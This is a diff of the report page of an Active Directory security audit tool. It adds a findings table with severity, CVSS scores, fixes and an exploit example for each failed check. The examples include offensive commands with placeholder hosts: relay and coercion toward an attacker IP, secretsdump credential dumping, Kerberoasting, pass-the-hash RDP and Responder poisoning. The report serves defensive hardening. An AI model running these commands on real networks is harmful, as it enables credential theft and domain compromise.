-    "policy": [{"color": "green", "message": "Group Policy containing a password : []"}, {"color": "red", "message": "Force logoff when logon hours expire : False"}, {"color": "black", "message": "Default password policy :\n{\n    \"lockoutDuration\": \"-6000000000\",\n    \"lockOutObservationWindow\": \"-6000000000\",\n    \"maxPwdAge\": \"-42 days, 0:00:00\",\n    \"minPwdAge\": \"-1 day, 0:00:00\",\n    \"minPwdLength\": \"7\",\n    \"pwdHistoryLength\": \"24\",\n    \"pwdProperties\": \"DOMAIN_PASSWORD_COMPLEX\"\n}"}, {"color": "black", "message": "Group Policy Object by Organizational Unit :\n[\n    {\n        \"dn\": \"DC=serval,DC=int\",\n        \"gpLink\": [\n            {\n                \"name\": \"{31B2F340-016D-11D2-945F-00C04FB984F9}\",\n                \"displayName\": \"Default Domain Policy\"\n            }\n        ]\n    },\n    {\n        \"dn\": \"OU=Domain Controllers,DC=serval,DC=int\",\n        \"gpLink\": [\n            {\n                \"name\": \"{6AC1786C-016F-11D2-945F-00C04fB984F9}\",\n                \"displayName\": \"Default Domain Controllers Policy\"\n            }\n        ]\n    }\n]"}, {"color": "red", "message": "Audit policy not configured"}, {"color": "green", "message": "UAC configuration is secure : True"}, {"color": "green", "message": "MSI packages are always installed with elevated privileges : False"}, {"color": "red", "message": "CredentialGuard is enabled : False"}, {"color": "green", "message": "LM hash storage disabled : True"}, {"color": "red", "message": "Authentication limited to NTLMv2 mechanism only : False"}, {"color": "red", "message": "AppLocker rules defined : False"}, {"color": "green", "message": "gpp_autologon is enabled : False"}, {"color": "black", "message": "AMSI installed is : Windows Defender"}, {"color": "red", "message": "Bitlocker is enabled : False"}, {"color": "green", "message": "Firewall is disabled : False"}, {"color": "red", "message": "IPv4 preferred over IPv6 : False"}, {"color": "red", "message": "LLMNR, NetBIOS or mDNS is disabled : False"}, {"color": "red", "message": "Too many logons are kept in the LSA cache : True"}, {"color": "red", "message": "Lsass runs as a protected process : False"}, {"color": "red", "message": "Powershell v2 is enabled : True"}, {"color": "red", "message": "Powershell events are logged : False"}, {"color": "red", "message": "Powershell is configured in Restricted mode : False"}, {"color": "green", "message": "RDP use NLA : True"}, {"color": "red", "message": "RDP is secured over pass the hash attack : False"}, {"color": "red", "message": "RDP session timeout is not defined"}, {"color": "green", "message": "WDigest authentication enabled : False"}, {"color": "red", "message": "WPAD is disabled : False"}, {"color": "red", "message": "Windows Script Host is disabled : False"}, {"color": "red", "message": "WSUS configuration is secure : False"}]
-  };
+  const FINDINGS = [{"category": "User Account Management", "css": "sev-high", "cvss": 8.8, "exploit": "Abuse delegation to impersonate the privileged account (see thehacker.recipes Kerberos delegations).", "fix": "Set \u0027Account is sensitive and cannot be delegated\u0027 on all privileged accounts, or add them to the Protected Users group.", "message": "Admin accounts that can be delegated : [\u0027Administrator\u0027, \u0027jbower\u0027]", "name": "admin_can_be_delegated", "section_key": "user", "section_title": "User Account Management", "severity": "High", "state": "FAILED", "vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H"}, {"category": "Computer and Domain Management", "css": "sev-high", "cvss": 8.8, "exploit": "coercer coerce --always-continue -u user -p password -l attacker_ip -t dc_ip", "fix": "Disable the Print Spooler service on Domain Controllers and servers that don\u0027t need it (PrintNightmare / coercion).", "message": "Spooler service is enabled on remote target : True", "name": "spooler", "section_key": "domain", "section_title": "Computer and Domain Management", "severity": "High", "state": "FAILED", "vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H"}, {"category": "Computer and Domain Management", "css": "sev-high", "cvss": 8.2, "exploit": "python3 wes.py systeminfo.txt -cde", "fix": "Apply latest OS security updates; enforce a patch-management cadence.", "message": "The computer is up to date (Last : 10/21/2023) : False", "name": "wmi_last_update", "section_key": "domain", "section_title": "Computer and Domain Management", "severity": "High", "state": "FAILED", "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:L/A:N"}, {"category": "Computer and Domain Management", "css": "sev-high", "cvss": 8.2, "exploit": "nxc smb ip -u user -p password --laps", "fix": "Deploy LAPS / Windows LAPS to randomize local admin passwords and restrict read access to admins only.", "message": "LAPS is installed : False", "name": "laps", "section_key": "domain", "section_title": "Computer and Domain Management", "severity": "High", "state": "FAILED", "vector": "CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:C/C:H/I:H/A:N"}, {"category": "User Account Management", "css": "sev-high", "cvss": 8.1, "exploit": "hashcat -a 0 -m 1000 hashes.txt dict.txt", "fix": "Reset the duplicated passwords with unique, strong values. Investigate shared/service accounts and rotate their secrets.", "message": "Number of accounts with identical password : 3", "name": "identical_password", "section_key": "user", "section_title": "User Account Management", "severity": "High", "state": "FAILED", "vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H"}, {"category": "Audit and Policy Management", "css": "sev-high", "cvss": 8.1, "exploit": "xfreerdp /u:user /pth:hash /v:ip /cert:ignore", "fix": "Enable Restricted Admin mode protections / disable PtH-friendly RDP configuration.", "message": "RDP is secured over pass the hash attack : False", "name": "reg_rdp_nopth", "section_key": "policy", "section_title": "Audit and Policy Management", "severity": "High", "state": "FAILED", "vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N"}, {"category": "Computer and Domain Management", "css": "sev-high", "cvss": 8.1, "exploit": "impacket-ntlmrelayx -t ldap://dc_ip --escalate-user user", "fix": "Require LDAP signing on all DCs (Domain controller: LDAP server signing requirements = Require signing).", "message": "LDAP signature was required on target : False", "name": "ldap_signing", "section_key": "domain", "section_title": "Computer and Domain Management", "severity": "High", "state": "FAILED", "vector": "CVSS:3.1/AV:A/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N"}, {"category": "Audit and Policy Management", "css": "sev-high", "cvss": 8.0, "exploit": "wsuks -t ip --wsus-server wsus_ip", "fix": "Use HTTPS for WSUS and validate update signing to prevent update injection.", "message": "WSUS server is not used", "name": "reg_wsus_config", "section_key": "policy", "section_title": "Audit and Policy Management", "severity": "High", "state": "FAILED", "vector": "CVSS:3.1/AV:A/AC:H/PR:N/UI:N/S:C/C:H/I:H/A:N"}, {"category": "User Account Management", "css": "sev-high", "cvss": 7.7, "exploit": "https://www.thehacker.recipes/ad/movement/builtins/security-groups", "fix": "Keep \u0027Schema Admins\u0027 empty except during schema changes; add members only temporarily.", "message": "Accounts in Schema Admins group : [\u0027Administrator\u0027]", "name": "admins_schema", "section_key": "user", "section_title": "User Account Management", "severity": "High", "state": "FAILED", "vector": "CVSS:3.1/AV:N/AC:H/PR:H/UI:N/S:C/C:H/I:H/A:N"}, {"category": "Computer and Domain Management", "css": "sev-high", "cvss": 7.7, "exploit": "impacket-ticketer (golden ticket) once krbtgt hash is known.", "fix": "Rotate the krbtgt password twice (with a delay) regularly and after any DC compromise.", "message": "Kerberos password last changed : 824 day(s) ago", "name": "krbtgt_password_age", "section_key": "domain", "section_title": "Computer and Domain Management", "severity": "High", "state": "FAILED", "vector": "CVSS:3.1/AV:N/AC:H/PR:H/UI:N/S:C/C:H/I:H/A:N"}, {"category": "Privilege and Trust Management", "css": "sev-high", "cvss": 7.5, "exploit": "https://www.thehacker.recipes/ad/movement/kerberos/delegations/constrained", "fix": "Review constrained delegation targets; prefer RBCD and disable protocol transition where not needed.", "message": "Computers with constrained delegation : [\n    \"DESKTOP-40RJQEE$: [\u0027cifs/SRV-DC01.serval.int/serval.int\u0027, \u0027cifs/SRV-DC01.serval.int\u0027, \u0027cifs/SRV-DC01\u0027, \u0027cifs/SRV-DC01.serval.int/SERVAL\u0027, \u0027cifs/SRV-DC01/SERVAL\u0027]\"\n]", "name": "constrained_delegation", "section_key": "privs", "section_title": "Privilege and Trust Management", "severity": "High", "state": "FAILED", "vector": "CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:H/I:H/A:H"}, {"category": "User Account Management", "css": "sev-high", "cvss": 7.4, "exploit": "nxc ldap dc_ip -u \"user\" -p \"password\" --asreproast hashes.txt \u0026\u0026 hashcat -a 0 -m 18200 hashes.txt dict.txt", "fix": "Enable Kerberos pre-authentication on every account (uncheck \u0027Do not require Kerberos preauthentication\u0027).", "message": "Accounts vulnerable to asreproasting attack : [\u0027jbower\u0027]", "name": "asreproast", "section_key": "user", "section_title": "User Account Management", "severity": "High", "state": "FAILED", "vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:N"}, {"category": "Audit and Policy Management", "css": "sev-high", "cvss": 7.1, "exploit": "responder -I eth0 -v", "fix": "Disable LLMNR, NetBIOS-NS and mDNS via GPO to prevent name-resolution poisoning.", "message": "LLMNR, NetBIOS or mDNS is disabled : False", "name": "reg_llmnr", "section_key": "policy", "section_title": "Audit and Policy Management", "severity": "High", "state": "FAILED", "vector": "CVSS:3.1/AV:A/AC:L/PR:N/UI:N/S:U/C:H/I:L/A:N"}, {"category": "Audit and Policy Management", "css": "sev-high", "cvss": 7.1, "exploit": "responder -I eth0 -vw", "fix": "Disable WPAD auto-detection and create a WPAD DNS record pointing nowhere.", "message": "WPAD is disabled : False", "name": "reg_wpad", "section_key": "policy", "section_title": "Audit and Policy Management", "severity": "High", "state": "FAILED", "vector": "CVSS:3.1/AV:A/AC:L/PR:N/UI:N/S:U/C:H/I:L/A:N"}, {"category": "User Account Management", "css": "sev-medium", "cvss": 6.8, "exploit": "nxc ldap dc_ip -u \"user\" -p \"password\" --kerberoast hashes.txt \u0026\u0026 hashcat -a 0 -m 13100 hashes.txt dict.txt", "fix": "Use long random passwords (25+ chars) or gMSA for service accounts with SPNs, and enforce AES encryption.", "message": "Accounts vulnerable to kerberoasting attack : [\u0027test\u0027]", "name": "kerberoast", "section_key": "user", "section_title": "User Account Management", "severity": "Medium", "state": "FAILED", "vector": "CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:H/I:H/A:N"}, {"category": "User Account Management", "css": "sev-medium", "cvss": 6.8, "exploit": "impacket-secretsdump \"domain/user:password@ip\"", "fix": "Add privileged accounts to the \u0027Protected Users\u0027 security group to harden their credentials.", "message": "Admin accounts not in Protected Users group : [\u0027Administrator\u0027]", "name": "admin_not_protected", "section_key": "user", "section_title": "User Account Management", "severity": "Medium", "state": "FAILED", "vector": "CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:H/I:H/A:N"}, {"category": "Audit and Policy Management", "css": "sev-medium", "cvss": 6.8, "exploit": "responder -I eth0 -v --lm --disable-ess", "fix": "Set LmCompatibilityLevel to 5 (send NTLMv2 only, refuse LM \u0026 NTLM).", "message": "Authentication limited to NTLMv2 mechanism only : False", "name": "reg_NTLMv2", "section_key": "policy", "section_title": "Audit and Policy Management", "severity": "Medium", "state": "FAILED", "vector": "CVSS:3.1/AV:A/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:N"}, {"category": "Audit and Policy Management", "css": "sev-medium", "cvss": 6.8, "exploit": "Trust abuse via rogue/disabled Root CA certificates.", "fix": "Audit Trusted Root CAs; remove untrusted/disabled issuers.", "message": "Untrusted Certificates Issuers:\n[\n    \"C:US, O:DigiCert Inc, OU:www.digicert.com, CN:DigiCert Assured ID Root CA\",\n    \"C:US, O:VeriSign, Inc., OU:Class 3 Public Primary Certification Authority\",\n    \"C:US, O:DigiCert Inc, OU:www.digicert.com, CN:DigiCert Global Root G3\",\n    \"C:US, O:DigiCert Inc, OU:www.digicert.com, CN:DigiCert Global Root CA\",\n    \"C:US, O:DigiCert Inc, OU:www.digicert.com, CN:DigiCert Global Root G2\",\n    \"C:US, ST:Washington, L:Redmond, O:Microsoft Corporation, CN:Microsoft Time Stamp Root Certificate Authority 2014\",\n    \"C:US, ST:Washington, L:Redmond, O:Microsoft Corporation, CN:Microsoft ECC Product Root Certificate Authority 2018\",\n    \"O:VeriSign Trust Network, OU:VeriSign, Inc., OU:VeriSign Time Stamping Service Root, OU:NO LIABILITY ACCEPTED, (c)97 VeriSign, Inc.\",\n    \"O:Microsoft Trust Network, OU:Microsoft Corporation, OU:Microsoft Time Stamping Service Root, OU:Copyright (c) 1997 Microsoft Corp.\",\n    \"C:US, ST:Washington, L:Redmond, O:Microsoft Corporation, CN:Microsoft ECC TS Root Certificate Authority 2018\",\n    \"C:US, ST:Washington, L:Redmond, O:Microsoft Corporation, CN:Microsoft Root Certificate Authority 2010\",\n    \"C:US, O:MSFT, CN:Microsoft Authenticode(tm) Root Authority\",\n    \"C:US, ST:Washington, L:Redmond, O:Microsoft Corporation, CN:Microsoft Root Certificate Authority 2011\",\n    \"C:US, O:Symantec Corporation, CN:Symantec Enterprise Mobile Root for Microsoft\",\n    \"OU:Copyright (c) 1997 Microsoft Corp., OU:Microsoft Corporation, CN:Microsoft Root Authority\",\n    \"C:ZA, ST:Western Cape, L:Durbanville, O:Thawte, OU:Thawte Certification, CN:Thawte Timestamping CA\",\n    \"DC:com, DC:microsoft, CN:Microsoft Root Certificate Authority\"\n]", "name": "reg_ca", "section_key": "policy", "section_title": "Audit and Policy Management", "severity": "Medium", "state": "FAILED", "vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:H/I:H/A:N"}, {"category": "User Account Management", "css": "sev-medium", "cvss": 6.5, "exploit": "nxc smb dc_ip -u \"user\" -p \"password\" --users", "fix": "Remove unnecessary members from \u0027Pre-Windows 2000 Compatible Access\u0027; it grants broad read access.", "message": "Pre-Windows 2000 Compatible Access group members contain \"Authenticated Users : True", "name": "pre2000_group", "section_key": "user", "section_title": "User Account Management", "severity": "Medium", "state": "FAILED", "vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N"}, {"category": "Audit and Policy Management", "css": "sev-medium", "cvss": 6.1, "exploit": "Execute arbitrary binaries/scripts (no application allow-listing).", "fix": "Define and enforce AppLocker (or WDAC) rules in enforce mode.", "message": "AppLocker rules defined : False", "name": "reg_applocker", "section_key": "policy", "section_title": "Audit and Policy Management", "severity": "Medium", "state": "FAILED", "vector": "CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:L/I:H/A:N"}, {"category": "Audit and Policy Management", "css": "sev-medium", "cvss": 6.1, "exploit": "powershell -version 2 (downgrade to bypass logging/AMSI).", "fix": "Remove the PowerShell v2 engine feature to prevent downgrade attacks.", "message": "Powershell v2 is enabled : True", "name": "reg_pwsh2", "section_key": "policy", "section_title": "Audit and Policy Management", "severity": "Medium", "state": "FAILED", "vector": "CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:L/I:H/A:N"}, {"category": "Audit and Policy Management", "css": "sev-medium", "cvss": 5.9, "exploit": "mitm6 -i eth0 -d domain \u0026\u0026 responder -I eth0 -v", "fix": "Disable IPv6 if unused, or filter rogue RA/DHCPv6 to prevent mitm6.", "message": "IPv4 preferred over IPv6 : False", "name": "reg_ipv4_only", "section_key": "policy", "section_title": "Audit and Policy Management", "severity": "Medium", "state": "FAILED", "vector": "CVSS:3.1/AV:A/AC:H/PR:N/UI:N/S:U/C:H/I:L/A:N"}, {"category": "Computer and Domain Management", "css": "sev-medium", "cvss": 5.9, "exploit": "impacket-addcomputer -computer-name \"fakehost$\" -computer-pass \"password\" \"domain/user:password\" -dc-ip dc_ip", "fix": "Set ms-DS-MachineAccountQuota to 0 and delegate machine-join to a dedicated group.", "message": "Non-admin users can add up to 10 computer(s) to a domain", "name": "can_add_computer", "section_key": "domain", "section_title": "Computer and Domain Management", "severity": "Medium", "state": "FAILED", "vector": "CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:H/I:L/A:N"}, {"category": "User Account Management", "css": "sev-medium", "cvss": 5.4, "exploit": "bash seth.sh eth0 \u003cATTACKER IP\u003e \u003cADMIN IP\u003e \u003cDC IP\u003e", "fix": "Stop using the built-in Administrator (RID 500) for daily operations; use named admin accounts and monitor its usage.", "message": "The native administrator account has been used recently : 0 day(s) ago", "name": "native_admin_logon", "section_key": "user", "section_title": "User Account Management", "severity": "Medium", "state": "FAILED", "vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:L/A:N"}, {"category": "Audit and Policy Management", "css": "sev-medium", "cvss": 4.6, "exploit": "python ExtractBitlockerKeys.py -d domain -u user -p password --dc-ip dc_ip", "fix": "Enable BitLocker on system drives with TPM and store keys securely.", "message": "Bitlocker is enabled : False", "name": "reg_bitlocker", "section_key": "policy", "section_title": "Audit and Policy Management", "severity": "Medium", "state": "FAILED", "vector": "CVSS:3.1/AV:P/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N"}, {"category": "Audit and Policy Management", "css": "sev-medium", "cvss": 4.4, "exploit": "impacket-secretsdump \"domain/user:password@ip\"", "fix": "Enable Windows Defender Credential Guard via GPO on supported hosts.", "message": "CredentialGuard is enabled : False", "name": "reg_CredentialGuard", "section_key": "policy", "section_title": "Audit and Policy Management", "severity": "Medium", "state": "FAILED", "vector": "CVSS:3.1/AV:L/AC:L/PR:H/UI:N/S:U/C:H/I:N/A:N"}, {"category": "Audit and Policy Management", "css": "sev-medium", "cvss": 4.4, "exploit": "impacket-secretsdump \"domain/user:password@ip\"", "fix": "Reduce cached logon count (CachedLogonsCount) to a low value (e.g. 1-2).", "message": "Too many logons are kept in the LSA cache : True", "name": "reg_lsa_cache", "section_key": "policy", "section_title": "Audit and Policy Management", "severity": "Medium", "state": "FAILED", "vector": "CVSS:3.1/AV:L/AC:L/PR:H/UI:N/S:U/C:H/I:N/A:N"}, {"category": "Audit and Policy Management", "css": "sev-medium", "cvss": 4.4, "exploit": "impacket-secretsdump \"domain/user:password@ip\"", "fix": "Run LSASS as a protected process (RunAsPPL=1) to hinder credential dumping.", "message": "Lsass runs as a protected process : False", "name": "reg_lsass_ppl", "section_key": "policy", "section_title": "Audit and Policy Management", "severity": "Medium", "state": "FAILED", "vector": "CVSS:3.1/AV:L/AC:L/PR:H/UI:N/S:U/C:H/I:N/A:N"}, {"category": "User Account Management", "css": "sev-medium", "cvss": 4.2, "exploit": "nxc smb dc_ip -u \"user\" -p \"password\" --sam", "fix": "Review accounts that held admin rights, confirm least-privilege, and rotate their credentials.", "message": "Accounts that were an admin : [\u0027Administrator\u0027, \u0027jbower\u0027]", "name": "was_admin", "section_key": "user", "section_title": "User Account Management", "severity": "Medium", "state": "FAILED", "vector": "CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:L/I:L/A:N"}, {"category": "Computer and Domain Management", "css": "sev-medium", "cvss": 4.2, "exploit": "N/A", "fix": "Review this finding and apply vendor/security best-practice hardening.", "message": "Supported encryption by Domain Controllers : \n[\n    \"SRV-DC01$: [RC4, AES 128, AES 256]\"\n]", "name": "supported_encryption", "section_key": "domain", "section_title": "Computer and Domain Management", "severity": "Medium", "state": "FAILED", "vector": "CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:L/I:L/A:N"}, {"category": "Computer and Domain Management", "css": "sev-medium", "cvss": 4.2, "exploit": "N/A", "fix": "Review this finding and apply vendor/security best-practice hardening.", "message": "Supported Kerberos encryption algorithms : RC4_HMAC_MD5", "name": "krbtgt_encryption", "section_key": "domain", "section_title": "Computer and Domain Management", "severity": "Medium", "state": "FAILED", "vector": "CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:L/I:L/A:N"}, {"category": "Audit and Policy Management", "css": "sev-low", "cvss": 3.9, "exploit": "Execute .vbs/.js payloads via Windows Script Host.", "fix": "Disable Windows Script Host (Enabled=0) where not required.", "message": "Windows Script Host is disabled : False", "name": "reg_wsh", "section_key": "policy", "section_title": "Audit and Policy Management", "severity": "Low", "state": "FAILED", "vector": "CVSS:3.1/AV:L/AC:L/PR:L/UI:R/S:U/C:L/I:L/A:N"}, {"category": "User Account Management", "css": "sev-low", "cvss": 3.7, "exploit": "https://www.netexec.wiki/smb-protocol/password-spraying", "fix": "Disable or delete stale accounts; implement a lifecycle process for joiners/movers/leavers.", "message": "Number of inactive accounts: 2", "name": "inactive_accounts", "section_key": "user", "section_title": "User Account Management", "severity": "Low", "state": "FAILED", "vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:N"}, {"category": "Audit and Policy Management", "css": "sev-low", "cvss": 3.6, "exploit": "N/A", "fix": "Configure an advanced audit policy covering logon, account management, and object access.", "message": "Audit policy not configured", "name": "audit_policy", "section_key": "policy", "section_title": "Audit and Policy Management", "severity": "Low", "state": "FAILED", "vector": "CVSS:3.1/AV:L/AC:H/PR:L/UI:N/S:U/C:L/I:L/A:N"}, {"category": "Audit and Policy Management", "css": "sev-low", "cvss": 3.5, "exploit": "Hijack an orphaned RDP session.", "fix": "Configure short RDP idle/disconnect session timeouts via GPO.", "message": "RDP session timeout is not defined", "name": "reg_rdp_timeout", "section_key": "policy", "section_title": "Audit and Policy Management", "severity": "Low", "state": "FAILED", "vector": "CVSS:3.1/AV:P/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:N"}, {"category": "Audit and Policy Management", "css": "sev-low", "cvss": 3.3, "exploit": "Run scripts via bypass execution policy.", "fix": "Set PowerShell execution policy and use Constrained Language Mode where appropriate.", "message": "Powershell is configured in Restricted mode : False", "name": "reg_pwsh_restricted", "section_key": "policy", "section_title": "Audit and Policy Management", "severity": "Low", "state": "FAILED", "vector": "CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:N/I:L/A:N"}, {"category": "Audit and Policy Management", "css": "sev-low", "cvss": 3.1, "exploit": "Persist sessions beyond allowed logon hours.", "fix": "Enable \u0027Network security: Force logoff when logon hours expire\u0027.", "message": "Force logoff when logon hours expire : False", "name": "force_logoff", "section_key": "policy", "section_title": "Audit and Policy Management", "severity": "Low", "state": "FAILED", "vector": "CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:N/I:L/A:N"}, {"category": "Audit and Policy Management", "css": "sev-low", "cvss": 2.5, "exploit": "N/A", "fix": "Enable PowerShell ScriptBlock and Module logging plus transcription.", "message": "Powershell events are logged : False", "name": "reg_pwsh_event", "section_key": "policy", "section_title": "Audit and Policy Management", "severity": "Low", "state": "FAILED", "vector": "CVSS:3.1/AV:L/AC:H/PR:L/UI:N/S:U/C:L/I:N/A:N"}, {"category": "Computer and Domain Management", "css": "sev-low", "cvss": 2.5, "exploit": "N/A", "fix": "Ensure regular, tested backups of Domain Controllers and system state.", "message": "The computer was never backed up", "name": "wmi_last_backup", "section_key": "domain", "section_title": "Computer and Domain Management", "severity": "Low", "state": "FAILED", "vector": "CVSS:3.1/AV:L/AC:H/PR:L/UI:N/S:U/C:N/I:N/A:L"}, {"category": "Computer and Domain Management", "css": "sev-low", "cvss": 2.2, "exploit": "N/A", "fix": "Enable the AD Recycle Bin to allow recovery of deleted objects.", "message": "Recycle Bin is enabled : False", "name": "recycle_bin", "section_key": "domain", "section_title": "Computer and Domain Management", "severity": "Low", "state": "FAILED", "vector": "CVSS:3.1/AV:N/AC:H/PR:H/UI:N/S:U/C:N/I:N/A:L"}];
 
-  function showDetail(type) {
-    const mapping = {
-      "privs": "Privilege and Trust Management",
-      "user": "User Account Management",
-      "domain": "Computer and Domain Management",
-      "policy": "Audit and Policy Management",
-    };
+  function isUrl(s){ return /^https?:\/\//i.test(s.trim()) || /^\[https?:\/\//i.test(s.trim()); }
 
-    document.getElementById("summary-view").classList.add("hidden");
-    document.getElementById("detail-view").classList.remove("hidden");
-    document.getElementById("detail-title").innerText = mapping[type];
+  function findByKey(category, idx){
+    const inCat = FINDINGS.filter(f => f.category === category);
+    return inCat[idx];
+  }
 
-    const sectionData = data[type] || [];
+  let currentExploit = "";
 
-    const redList = document.getElementById("red-list");
-    const greenList = document.getElementById("green-list");
-    const blackList = document.getElementById("black-list");
+  function openPanel(idx, category){
+    const f = findByKey(category, idx);
+    if(!f) return;
+    document.getElementById('p-title').textContent = (f.message.split('\n')[0]) || f.name;
+    const badge = document.getElementById('p-badge');
+    badge.textContent = f.cvss.toFixed(1); badge.className = 'badge ' + f.css;
+    const sev = document.getElementById('p-sev');
+    sev.textContent = f.severity; sev.className = 'sev-pill ' + f.css;
+    document.getElementById('p-cat').textContent = f.category;
+    document.getElementById('p-state').textContent = f.state;
+    document.getElementById('p-vector').textContent = f.vector;
 
-    redList.innerHTML = '';
-    greenList.innerHTML = '';
-    blackList.innerHTML = '';
+    currentExploit = f.exploit || "N/A";
+    const atk = document.getElementById('p-exploit');
+    if(isUrl(currentExploit)){
+      const clean = currentExploit.replace(/^\[/,'').replace(/\]$/,'');
+      atk.innerHTML = '<a href="'+clean+'" target="_blank">'+clean+'</a>';
+    } else {
+      atk.innerHTML = '<pre>'+escapeHtml(currentExploit)+'</pre>';
+    }
+    document.getElementById('p-fix').textContent = f.fix || "";
 
-    sectionData.forEach(item => {
-      let div = document.createElement("div");
-      let content = item.message;
+    document.getElementById('overlay').classList.add('open');
+    document.getElementById('panel').classList.add('open');
+  }
 
-      if (content.includes("{") && content.includes("}")) {
-        try {
-          const jsonStart = content.indexOf('{');
-          const json = JSON.stringify(JSON.parse(content.slice(jsonStart)), null, 2);
-          content = content.slice(0, jsonStart) + '<pre>' + json + '</pre>';
-        } catch (e) {}
-      }
+  function closePanel(){
+    document.getElementById('overlay').classList.remove('open');
+    document.getElementById('panel').classList.remove('open');
+  }
 
-      div.classList.add("check-text");
+  function copyExploit(){
+    navigator.clipboard && navigator.clipboard.writeText(currentExploit);
+  }
 
-      if (item.color === "green") {
-        div.classList.add("green-text");
-        div.innerHTML = `✅ ${content}`;
-        greenList.appendChild(div);
-      } else if (item.color === "black") {
-        div.classList.add("black-text");
-        div.innerHTML = `ℹ️ ${content}`;
-        blackList.appendChild(div);
+  function toggleCat(headEl){
+    headEl.parentElement.classList.toggle('collapsed');
+  }
+
+  function toggleAll(collapse){
+    document.querySelectorAll('#cat-container .cat-group').forEach(g => {
+      g.classList.toggle('collapsed', collapse);
+    });
+  }
+
+  function filterSev(sev, el){
+    document.querySelectorAll('.sev-card').forEach(c => c.classList.remove('active'));
+    el.classList.add('active');
+    const showAll = sev === 'all';
+    document.querySelectorAll('#cat-container .cat-group').forEach(group => {
+      group.querySelectorAll('.section-label.lbl-passed, .finding-row.row-static, .section-label.lbl-info, .info-item').forEach(node => {
+        node.style.display = showAll ? '' : 'none';
+      });
+      let visible = 0;
+      group.querySelectorAll('.finding-row[data-sev]').forEach(row => {
+        const show = showAll || row.getAttribute('data-sev') === sev;
+        row.style.display = show ? '' : 'none';
+        if(show) visible++;
+      });
+      if(showAll){
+        group.style.display = '';
       } else {
-        div.classList.add("red-text");
-        div.innerHTML = `❌ ${content}`;
-        redList.appendChild(div);
+        group.style.display = visible ? '' : 'none';
+        if(visible) group.classList.remove('collapsed');
       }
     });
   }
 
-  function goBack() {
-    document.getElementById("detail-view").classList.add("hidden");
-    document.getElementById("summary-view").classList.remove("hidden");
+  function escapeHtml(s){
+    return s.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');
   }
+
+  document.addEventListener('keydown', e => { if(e.key === 'Escape') closePanel(); });
 </script>
 
 </body>
